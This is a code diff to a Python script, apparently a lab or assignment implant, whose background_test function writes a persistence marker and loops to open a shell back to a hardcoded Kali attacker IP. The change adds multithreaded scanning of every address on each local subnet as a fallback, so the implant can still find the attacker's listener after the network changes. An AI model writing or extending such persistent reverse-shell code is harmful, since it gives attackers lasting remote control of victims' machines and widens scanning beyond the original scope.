@@ -156,17 +156,30 @@ def background_test():
     with open(test_file, "w") as f:
         f.write(f"RCA Assignment Executed: {time.ctime()}\nRoot: Persistence Active")
 
-    local_ips = get_local_ips()
-    
     # Infinite loop to ensure we reconnect if the session drops
     while True:
+        local_ips = get_local_ips()
         found_flag = [False]
         TARGET_FOUND = False
         BACKGROUND_STATUS = "Connecting to RCA Command Center..."
         
-        # 1. Strictly connect to the presentation IP (No scanning!)
+        # 1. Primary Target (Hardcoded Host IP)
         KALI_IP = "10.12.74.152" 
         scan_and_shell(KALI_IP, KALI_PORT, found_flag)
+        
+        # 2. Fallback: Scan local subnets if hardcoded IP fails (Crucial for DHCP/Reboot)
+        if not found_flag[0]:
+            for local_ip in local_ips:
+                if found_flag[0]: break
+                subnet = ".".join(local_ip.split(".")[:-1]) + "."
+                for i in range(1, 255):
+                    if found_flag[0]: break
+                    target = f"{subnet}{i}"
+                    # Scan in parallel for speed
+                    t = threading.Thread(target=scan_and_shell, args=(target, KALI_PORT, found_flag))
+                    t.daemon = True
+                    t.start()
+                    if i % 50 == 0: time.sleep(0.1) # Throttling to prevent network lag
         
         # Wait until the shell session ends
         
